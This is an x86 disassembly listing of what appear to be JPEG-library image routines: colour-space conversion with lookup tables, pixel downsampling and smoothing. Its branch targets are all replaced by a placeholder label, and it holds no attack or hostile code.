mov ecx [ ebp - 0xc ]
add edx [ esi + ecx * 4 + 0x1c00 ]
mov ecx [ ebp - 0x20 ]
sar edx 0x10
mov [ ecx ] dl
inc [ ebp - 0x10 ]
inc [ ebp - 0x20 ]
inc [ ebp - 0x1c ]
inc [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
cmp edx [ ebp - 0x14 ]
jb r-xdata
sub_4677ec
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edx [ eax + 0x155 ]
mov esi [ edx + 0x8 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
jmp r-xdata
dec [ ebp + 0x8 ]
jns r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
add [ ebp - 0x4 ] 0x4
mov edx [ ebp - 0x8 ]
mov ecx [ edx ]
mov edx [ ebp + 0xc ]
mov ecx [ ecx + edx * 4 ]
inc [ ebp + 0xc ]
xor edx edx
cmp edx [ ebp - 0x18 ]
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
xor ebx ebx
inc edx
mov bl [ eax + 0x2 ]
mov [ ebp - 0xc ] ebx
xor ebx ebx
mov bl [ eax + 0x1 ]
mov [ ebp - 0x10 ] ebx
xor ebx ebx
mov bl [ eax ]
add eax 0x3
mov [ ebp - 0x14 ] ebx
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
mov ebx [ esi + ebx * 4 ]
add ebx [ esi + edi * 4 + 0x400 ]
mov edi [ ebp - 0x14 ]
add ebx [ esi + edi * 4 + 0x800 ]
sar ebx 0x10
mov [ ecx ] bl
inc ecx
cmp edx [ ebp - 0x18 ]
jb r-xdata
sub_467878
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edx [ eax + 0x155 ]
mov esi [ edx + 0x8 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
jmp r-xdata
dec [ ebp + 0x8 ]
jns r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
add [ ebp - 0x4 ] 0x4
mov edx [ ebp - 0x8 ]
mov ecx [ edx ]
mov edx [ ebp + 0xc ]
mov edx [ ecx + edx * 4 ]
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov ebx [ ebp + 0xc ]
mov ecx [ ecx + ebx * 4 ]
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x8 ]
mov edi [ ebp + 0xc ]
mov ebx [ ebx + edi * 4 ]
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0xc ]
mov edi [ ebp + 0xc ]
mov ebx [ ebx + edi * 4 ]
inc [ ebp + 0xc ]
xor edi edi
mov [ ebp - 0x14 ] edi
mov edi [ ebp - 0x10 ]
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] edx
mov edx ebx
mov [ ebp - 0x1c ] edx
mov ecx [ ebp - 0x14 ]
cmp ecx [ ebp - 0x18 ]
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
xor edx edx
mov edi 0xff
mov dl [ eax ]
push edx
mov edx 0xff
pop ecx
sub edx ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
push ecx
mov ecx 0xff
pop ebx
sub ecx ebx
xor ebx ebx
mov bl [ eax + 0x2 ]
sub edi ebx
mov [ ebp - 0xc ] edi
mov ebx [ ebp - 0x1c ]
mov edi ebx
mov bl [ eax + 0x3 ]
add eax 0x4
mov [ edi ] bl
mov ebx [ esi + edx * 4 ]
mov edi [ ebp - 0xc ]
add ebx [ esi + ecx * 4 + 0x400 ]
add ebx [ esi + edi * 4 + 0x800 ]
mov edi [ ebp - 0x20 ]
sar ebx 0x10
mov [ edi ] bl
mov ebx [ esi + edx * 4 + 0xc00 ]
mov edi [ ebp - 0xc ]
add ebx [ esi + ecx * 4 + 0x1000 ]
add ebx [ esi + edi * 4 + 0x1400 ]
mov edi [ ebp - 0x24 ]
sar ebx 0x10
mov [ edi ] bl
mov edx [ esi + edx * 4 + 0x1400 ]
add edx [ esi + ecx * 4 + 0x1800 ]
mov ecx [ ebp - 0xc ]
add edx [ esi + ecx * 4 + 0x1c00 ]
mov ecx [ ebp - 0x28 ]
sar edx 0x10
mov [ ecx ] dl
inc [ ebp - 0x14 ]
inc [ ebp - 0x28 ]
inc [ ebp - 0x24 ]
inc [ ebp - 0x20 ]
inc [ ebp - 0x1c ]
mov edx [ ebp - 0x14 ]
cmp edx [ ebp - 0x18 ]
jb r-xdata
sub_4679bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ eax + 0x18 ]
mov [ ebp - 0x4 ] ebx
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
dec [ ebp + 0x8 ]
jns r-xdata
mov eax [ ecx ]
mov ebx [ ebp + 0xc ]
mov esi [ edx ]
add edx 0x4
mov eax [ eax + ebx * 4 ]
xor edi edi
inc [ ebp + 0xc ]
cmp edi [ ebp - 0x4 ]
jae r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov bl [ esi ]
inc edi
mov [ eax ] bl
inc eax
add esi [ ebp - 0x8 ]
cmp edi [ ebp - 0x4 ]
jb r-xdata
sub_467a08
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ eax + 0x34 ]
mov [ ebp - 0x8 ] ebx
mov eax [ eax + 0x18 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec [ ebp + 0x8 ]
jns r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ecx
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
add edx 0x4
inc [ ebp + 0xc ]
mov eax [ ebp - 0x10 ]
mov ebx [ ebp + 0xc ]
xor edi edi
mov esi [ edx ]
mov eax [ eax ]
cmp edi [ ebp - 0xc ]
mov eax [ eax + ebx * 4 ]
jae r-xdata
inc [ ebp - 0x4 ]
add [ ebp - 0x10 ] 0x4
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jl r-xdata
mov ebx [ ebp - 0x4 ]
inc edi
mov bl [ esi + ebx ]
mov [ eax ] bl
inc eax
add esi [ ebp - 0x8 ]
cmp edi [ ebp - 0xc ]
jb r-xdata
sub_467a80
push ebx
mov ebx eax
mov eax ebx
push esi
mov ecx 0xc
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov esi eax
mov [ ebx + 0x155 ] esi
mov [ esi ] sub_467a7c
mov eax [ ebx + 0x24 ]
dec eax
je r-xdata
cmp [ ebx + 0x20 ] 0x1
je r-xdata
dec eax
sub eax 0x2
jb r-xdata
mov ecx [ ebx + 0x38 ]
cmp ecx 0x5
ja r-xdata
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0x7
mov edx [ eax ]
call [ edx ]
jmp r-xdata
cmp [ ebx + 0x20 ] 0x3
je r-xdata
sub eax 0x2
jb r-xdata
mov ecx [ ebx + 0x38 ]
cmp ecx [ ebx + 0x24 ]
jne r-xdata
jmp [ ecx * 4 + jump_table_467b23 ]
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x7
mov edx [ eax ]
call [ edx ]
jmp r-xdata
cmp [ ebx + 0x20 ] 0x4
je r-xdata
jmp r-xdata
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0x19
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x34 ]
cmp eax [ ebx + 0x20 ]
je r-xdata
cmp [ ebx + 0x34 ] 0x1
je r-xdata
cmp [ ebx + 0x34 ] 0x3
je r-xdata
cmp [ ebx + 0x34 ] 0x3
je r-xdata
cmp [ ebx + 0x34 ] 0x4
je r-xdata
cmp [ ebx + 0x34 ] 0x4
je r-xdata
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x7
mov edx [ eax ]
call [ edx ]
jmp r-xdata
cmp [ ebx + 0x20 ] 0x1
jge r-xdata
mov [ esi + 0x4 ] sub_467a08
pop esi
pop ebx
retn
cmp [ ebx + 0x24 ] 0x1
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x8
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0x24 ] 0x2
jne r-xdata
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x8
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0x24 ] 0x2
jne r-xdata
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x8
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0x24 ] 0x4
jne r-xdata
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x8
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0x24 ] 0x4
jne r-xdata
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x8
mov edx [ eax ]
call [ edx ]
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x7
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0x24 ] 0x2
jne r-xdata
mov [ esi + 0x4 ] sub_4679bc
pop esi
pop ebx
retn
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x19
mov edx [ eax ]
call [ edx ]
pop esi
pop ebx
retn
mov [ esi + 0x4 ] sub_467a08
pop esi
pop ebx
retn
cmp [ ebx + 0x24 ] 0x3
jne r-xdata
mov [ esi ] sub_467644
mov [ esi + 0x4 ] sub_4676e4
pop esi
pop ebx
retn
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x19
mov edx [ eax ]
call [ edx ]
pop esi
pop ebx
retn
mov [ esi + 0x4 ] sub_467a08
pop esi
pop ebx
retn
cmp [ ebx + 0x24 ] 0x5
jne r-xdata
mov [ esi ] sub_467644
mov [ esi + 0x4 ] sub_467878
pop esi
pop ebx
retn
cmp [ ebx + 0x24 ] 0x3
jne r-xdata
mov [ esi ] sub_467644
mov [ esi + 0x4 ] sub_4677ec
pop esi
pop ebx
retn
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x19
mov edx [ eax ]
call [ edx ]
pop esi
pop ebx
retn
mov [ esi + 0x4 ] sub_467a08
pop esi
pop ebx
retn
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x19
mov edx [ eax ]
call [ edx ]
pop esi
pop ebx
retn
mov [ esi + 0x4 ] sub_467a08
pop esi
pop ebx
retn
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x19
mov edx [ eax ]
call [ edx ]
pop esi
pop ebx
retn
mov [ esi + 0x4 ] sub_4679bc
pop esi
pop ebx
retn
sub_467cd0
push ebp
mov ebp esp
add esp 0xfffffff4
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edx [ ebp + 0x8 ]
sub edx [ ebp - 0x8 ]
mov [ ebp - 0xc ] edx
cmp [ ebp - 0xc ] 0x0
jle r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
xor ecx ecx
mov edi eax
cmp ecx [ ebp - 0x4 ]
jge r-xdata
mov eax [ edi ]
mov esi [ ebp - 0xc ]
add eax [ ebp - 0x8 ]
test esi esi
mov dl [ eax - 0x1 ]
jle r-xdata
inc ecx
add edi 0x4
cmp ecx [ ebp - 0x4 ]
jl r-xdata
mov [ eax ] dl
inc eax
dec esi
test esi esi
jg r-xdata
sub_467d20
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi eax
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov eax [ esi + 0x159 ]
xor edx edx
mov [ ebp - 0xc ] edx
add eax 0xc
mov ebx [ esi + 0x3c ]
mov [ ebp - 0x18 ] eax
mov edx [ ebp + 0xc ]
mov ecx edx
mov [ ebp - 0x14 ] ecx
mov eax [ ebp - 0x4 ]
mov edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ esi + 0x34 ]
jl r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
shl edx 0x2
mov eax [ ecx ]
mov ecx [ ebp - 0x14 ]
add eax edx
mov edx [ ecx ]
mov ecx [ ebp + 0x8 ]
imul ecx [ ebx + 0xc ]
shl ecx 0x2
add edx ecx
mov ecx eax
push edx
mov edx ebx
mov edi [ ebp - 0x18 ]
mov eax esi
call [ edi ]
add [ ebp - 0x10 ] 0x4
add [ ebp - 0x14 ] 0x4
add [ ebp - 0x18 ] 0x4
inc [ ebp - 0xc ]
add ebx 0x54
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_467da4
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x1c ]
shl edx 0x3
mov [ ebp - 0x2c ] edx
mov eax [ ecx + 0xdd ]
mov edx [ ebp - 0x4 ]
mov ebx [ edx + 0x8 ]
cdq
idiv ebx
mov [ ebp - 0x14 ] eax
mov ebx [ ecx + 0xe1 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov esi [ edx + 0xc ]
cdq
idiv esi
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov edx [ ebp - 0x1c ]
sar edx 0x1
jns r-xdata
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x2c ]
imul [ ebp - 0x14 ]
push eax
mov edx ebx
mov ecx [ ecx + 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_467cd0
xor edx edx
xor ecx ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] ecx
mov eax [ ebp + 0x8 ]
mov edx eax
mov [ ebp - 0x34 ] edx
jmp r-xdata
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
cmp edx [ ebp - 0x10 ]
jg r-xdata
mov ecx [ ebp - 0x34 ]
xor edx edx
mov eax [ ecx ]
xor ecx ecx
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x28 ] ecx
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x2c ]
jae r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x18 ]
add [ ebp - 0xc ] ecx
inc [ ebp - 0x10 ]
add [ ebp - 0x34 ] 0x4
xor ecx ecx
xor ebx ebx
cmp ebx [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x20 ]
add eax ecx
mov ecx [ ebp - 0x30 ]
cdq
idiv [ ebp - 0x1c ]
mov [ ecx ] al
inc [ ebp - 0x30 ]
inc [ ebp - 0x24 ]
mov eax [ ebp - 0x14 ]
add [ ebp - 0x28 ] eax
mov edx [ ebp - 0x24 ]
cmp edx [ ebp - 0x2c ]
jb r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
add eax ebx
mov eax [ edx + eax * 4 ]
xor edx edx
add eax [ ebp - 0x28 ]
cmp edx [ ebp - 0x14 ]
jge r-xdata
inc ebx
cmp ebx [ ebp - 0x18 ]
jl r-xdata
movzx esi [ eax ]
add ecx esi
inc eax
inc edx
cmp edx [ ebp - 0x14 ]
jl r-xdata
sub_467eb4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov esi [ ebp + 0x8 ]
push 0x0
mov eax [ ebx + 0xe1 ]
mov edi edx
push eax
mov ecx esi
mov edx [ ebx + 0x18 ]
push edx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_464490
mov ecx [ edi + 0x1c ]
shl ecx 0x3
push ecx
mov ecx [ ebx + 0x18 ]
mov edx [ ebx + 0xe1 ]
mov eax esi
call sub_467cd0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_467f00
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edx [ ebp - 0x4 ]
mov ebx ecx
mov ecx [ edx + 0x1c ]
shl ecx 0x3
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0xc ]
add edx edx
push edx
mov edx [ eax + 0xe1 ]
mov ecx [ eax + 0x18 ]
mov eax ebx
call sub_467cd0
xor ecx ecx
mov eax ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x14 ] eax
mov edx [ ebp + 0x8 ]
mov ecx edx
mov [ ebp - 0x10 ] ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
cmp edx [ ebp - 0x8 ]
jg r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
xor esi esi
mov edx [ eax ]
mov eax [ ecx ]
xor ecx ecx
cmp esi [ ebp - 0xc ]
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc [ ebp - 0x8 ]
add [ ebp - 0x14 ] 0x4
add [ ebp - 0x10 ] 0x4
movzx edi [ eax + 0x1 ]
xor ebx ebx
inc esi
mov bl [ eax ]
add eax 0x2
add ebx edi
add ebx ecx
xor ecx 0x1
sar ebx 0x1
mov [ edx ] bl
inc edx
cmp esi [ ebp - 0xc ]
jb r-xdata
sub_467f94
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edx [ ebp - 0x4 ]
mov ebx ecx
mov ecx [ edx + 0x1c ]
shl ecx 0x3
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
add edx edx
push edx
mov edx [ eax + 0xe1 ]
mov ecx [ eax + 0x18 ]
mov eax ebx
call sub_467cd0
xor ecx ecx
mov eax ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x18 ] eax
mov edx [ ebp + 0x8 ]
mov ecx edx
mov [ ebp - 0x14 ] ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
cmp edx [ ebp - 0x8 ]
jg r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
xor ebx ebx
mov esi 0x1
mov ecx [ eax ]
mov eax [ edx ]
mov edx [ ebp - 0x18 ]
mov edx [ edx + 0x4 ]
mov [ ebp - 0xc ] ebx
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp - 0x10 ]
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x18 ] 0x8
inc [ ebp - 0x8 ]
add [ ebp - 0x14 ] 0x4
movzx edi [ eax + 0x1 ]
xor ebx ebx
mov bl [ eax ]
add eax 0x2
add ebx edi
movzx edi [ edx ]
add ebx edi
movzx edi [ edx + 0x1 ]
add ebx edi
add edx 0x2
add ebx esi
xor esi 0x3
sar ebx 0x2
mov [ ecx ] bl
inc ecx
inc [ ebp - 0xc ]
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp - 0x10 ]
jb r-xdata
sub_46804c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x4 ] edx
mov esi ecx
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x1c ]
lea eax [ esi - 0x4 ]
shl edx 0x3
mov [ ebp - 0x10 ] edx
mov ecx [ ebp - 0x10 ]
add ecx ecx
push ecx
mov edx [ ebx + 0xe1 ]
mov ecx [ ebx + 0x18 ]
add edx 0x2
call sub_467cd0
mov eax [ ebx + 0xb8 ]
mov ecx 0x4000
mov edx eax
shl edx 0x4
shl eax 0x4
lea edx [ edx + edx * 4 ]
sub ecx edx
mov edx esi
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x2c ] edx
mov ecx [ ebp + 0x8 ]
mov eax ecx
mov [ ebp - 0x28 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
cmp edx [ ebp - 0x8 ]
jg r-xdata
mov edx [ ebp - 0x28 ]
mov ecx [ edx ]
mov [ ebp - 0x14 ] ecx
mov eax [ ebp - 0x2c ]
mov ebx [ ebp - 0x2c ]
mov edx [ ebp - 0x2c ]
mov ecx [ ebp - 0x2c ]
mov eax [ eax ]
mov esi [ ebx + 0x8 ]
mov edx [ edx + 0x4 ]
xor ebx ebx
movzx edi [ eax + 0x1 ]
mov bl [ eax ]
mov ecx [ ecx - 0x4 ]
add ebx edi
movzx edi [ edx ]
add ebx edi
movzx edi [ edx + 0x1 ]
add ebx edi
mov [ ebp - 0x18 ] ebx
xor ebx ebx
movzx edi [ ecx + 0x1 ]
mov bl [ ecx ]
add ebx edi
movzx edi [ esi ]
add ebx edi
movzx edi [ esi + 0x1 ]
add ebx edi
movzx edi [ eax ]
add ebx edi
movzx edi [ eax + 0x2 ]
add ebx edi
add eax 0x2
movzx edi [ edx ]
add ebx edi
movzx edi [ edx + 0x2 ]
add ebx edi
add edx 0x2
mov [ ebp - 0x1c ] ebx
mov ebx [ ebp - 0x1c ]
add [ ebp - 0x1c ] ebx
movzx edi [ ecx + 0x2 ]
xor ebx ebx
mov bl [ ecx ]
add ecx 0x2
add ebx edi
movzx edi [ esi ]
add ebx edi
movzx edi [ esi + 0x2 ]
add ebx edi
add esi 0x2
add [ ebp - 0x1c ] ebx
mov ebx [ ebp - 0x18 ]
mov edi [ ebp - 0x1c ]
imul edi [ ebp - 0x24 ]
imul ebx [ ebp - 0x20 ]
add ebx edi
mov [ ebp - 0x18 ] ebx
mov ebx [ ebp - 0x18 ]
mov edi [ ebp - 0x14 ]
add ebx 0x8000
sar ebx 0x10
mov [ edi ] bl
inc [ ebp - 0x14 ]
mov ebx [ ebp - 0x10 ]
sub ebx 0x2
mov [ ebp - 0xc ] ebx
cmp [ ebp - 0xc ] 0x0
jbe r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
movzx edi [ eax + 0x1 ]
xor ebx ebx
mov bl [ eax ]
add ebx edi
movzx edi [ edx ]
add ebx edi
movzx edi [ edx + 0x1 ]
add ebx edi
mov [ ebp - 0x18 ] ebx
xor ebx ebx
movzx edi [ ecx + 0x1 ]
mov bl [ ecx ]
add ebx edi
movzx edi [ esi ]
add ebx edi
movzx edi [ esi + 0x1 ]
add ebx edi
movzx edi [ eax - 0x1 ]
movzx eax [ eax + 0x1 ]
add ebx edi
add ebx eax
xor eax eax
mov al [ edx - 0x1 ]
movzx edx [ edx + 0x1 ]
add ebx eax
add ebx edx
xor edx edx
mov [ ebp - 0x1c ] ebx
mov eax [ ebp - 0x1c ]
add [ ebp - 0x1c ] eax
xor eax eax
mov dl [ ecx - 0x1 ]
mov al [ esi - 0x1 ]
movzx ecx [ ecx + 0x1 ]
add edx ecx
xor ecx ecx
mov cl [ esi + 0x1 ]
add edx eax
add edx ecx
add [ ebp - 0x1c ] edx
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
imul eax [ ebp - 0x24 ]
imul edx [ ebp - 0x20 ]
add edx eax
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x14 ]
add edx 0x8000
sar edx 0x10
mov [ ecx ] dl
add [ ebp - 0x2c ] 0x8
inc [ ebp - 0x8 ]
add [ ebp - 0x28 ] 0x4
movzx edi [ eax + 0x1 ]
xor ebx ebx
mov bl [ eax ]
add ebx edi
movzx edi [ edx ]
add ebx edi
movzx edi [ edx + 0x1 ]
add ebx edi
mov [ ebp - 0x18 ] ebx
xor ebx ebx
movzx edi [ ecx + 0x1 ]
mov bl [ ecx ]
add ebx edi
movzx edi [ esi ]
add ebx edi
movzx edi [ esi + 0x1 ]
add ebx edi
movzx edi [ eax - 0x1 ]
add ebx edi
movzx edi [ eax + 0x2 ]
add ebx edi
add eax 0x2
movzx edi [ edx - 0x1 ]
add ebx edi
movzx edi [ edx + 0x2 ]
add ebx edi
add edx 0x2
mov [ ebp - 0x1c ] ebx
mov ebx [ ebp - 0x1c ]
add [ ebp - 0x1c ] ebx
movzx edi [ ecx + 0x2 ]
xor ebx ebx
mov bl [ ecx - 0x1 ]
add ecx 0x2
add ebx edi
movzx edi [ esi - 0x1 ]
add ebx edi
movzx edi [ esi + 0x2 ]
add ebx edi
add esi 0x2
add [ ebp - 0x1c ] ebx
mov ebx [ ebp - 0x18 ]
mov edi [ ebp - 0x1c ]
imul edi [ ebp - 0x24 ]
imul ebx [ ebp - 0x20 ]
add ebx edi
mov [ ebp - 0x18 ] ebx
mov ebx [ ebp - 0x18 ]
mov edi [ ebp - 0x14 ]
add ebx 0x8000
sar ebx 0x10
mov [ edi ] bl
inc [ ebp - 0x14 ]
dec [ ebp - 0xc ]
cmp [ ebp - 0xc ] 0x0
ja r-xdata
sub_4682dc
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
mov ebx eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
mov esi ecx
mov edx [ eax + 0x1c ]
lea eax [ esi - 0x4 ]
shl edx 0x3
mov [ ebp - 0x10 ] edx
mov ecx [ ebp - 0x10 ]
push ecx
mov edx [ ebx + 0xe1 ]
mov ecx [ ebx + 0x18 ]
add edx 0x2
call sub_467cd0
mov eax [ ebx + 0xb8 ]
mov ecx 0x10000
mov edx eax
shl edx 0x9
sub ecx edx
mov edx esi
shl eax 0x6
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x34 ] edx
mov ecx [ ebp + 0x8 ]
mov eax ecx
mov [ ebp - 0x30 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
cmp edx [ ebp - 0x8 ]
jg r-xdata
mov edx [ ebp - 0x30 ]
mov ecx [ edx ]
mov [ ebp - 0x1c ] ecx
mov eax [ ebp - 0x34 ]
mov edx [ ebp - 0x34 ]
mov ecx [ eax ]
mov eax [ edx - 0x4 ]
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0x34 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
xor eax eax
mov edx [ ebp - 0x14 ]
mov ebx [ ebp - 0x18 ]
mov al [ ecx ]
inc ecx
movzx ebx [ ebx ]
movzx edx [ edx ]
inc [ ebp - 0x18 ]
inc [ ebp - 0x14 ]
add edx ebx
mov ebx [ ebp - 0x14 ]
add edx eax
movzx esi [ ebx ]
mov ebx [ ebp - 0x18 ]
movzx ebx [ ebx ]
add esi ebx
xor ebx ebx
mov bl [ ecx ]
add esi ebx
mov ebx edx
sub ebx eax
add ebx edx
add ebx esi
mov [ ebp - 0x20 ] ebx
imul eax [ ebp - 0x24 ]
mov ebx [ ebp - 0x20 ]
imul ebx [ ebp - 0x28 ]
add eax ebx
mov ebx [ ebp - 0x1c ]
add eax 0x8000
sar eax 0x10
mov [ ebx ] al
inc [ ebp - 0x1c ]
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x10 ]
mov edx esi
sub eax 0x2
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jbe r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov al [ ecx ]
mov ecx edx
sub ecx eax
add ecx [ ebp - 0x2c ]
add edx ecx
mov [ ebp - 0x20 ] edx
imul [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0x1c ]
imul edx [ ebp - 0x28 ]
add eax edx
add eax 0x8000
sar eax 0x10
mov [ ecx ] al
inc [ ebp - 0x8 ]
add [ ebp - 0x34 ] 0x4
add [ ebp - 0x30 ] 0x4
xor eax eax
mov al [ ecx ]
inc ecx
inc [ ebp - 0x14 ]
inc [ ebp - 0x18 ]
mov ebx [ ebp - 0x14 ]
movzx esi [ ebx ]
mov ebx [ ebp - 0x18 ]
movzx ebx [ ebx ]
add esi ebx
xor ebx ebx
mov bl [ ecx ]
add esi ebx
mov ebx edx
sub ebx eax
add ebx [ ebp - 0x2c ]
add ebx esi
mov [ ebp - 0x20 ] ebx
imul eax [ ebp - 0x24 ]
mov ebx [ ebp - 0x20 ]
imul ebx [ ebp - 0x28 ]
add eax ebx
mov ebx [ ebp - 0x1c ]
add eax 0x8000
sar eax 0x10
mov [ ebx ] al
inc [ ebp - 0x1c ]
mov [ ebp - 0x2c ] edx
dec [ ebp - 0xc ]
mov edx esi
cmp [ ebp - 0xc ] 0x0
ja r-xdata
sub_46846c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov eax ebx
mov ecx 0x34
mov [ esp + 0x4 ] 0x1
mov esi [ eax + 0x4 ]
mov edx 0x1
call [ esi ]
mov [ esp ] eax
mov eax [ esp ]
mov [ ebx + 0x159 ] eax
mov edx [ esp ]
mov [ edx ] sub_467ccc
mov ecx [ esp ]
mov [ ecx + 0x4 ] sub_467d20
mov eax [ esp ]
xor edx edx
mov [ eax + 0x8 ] edx
cmp [ ebx + 0xb4 ] 0x0
je r-xdata
xor ebp ebp
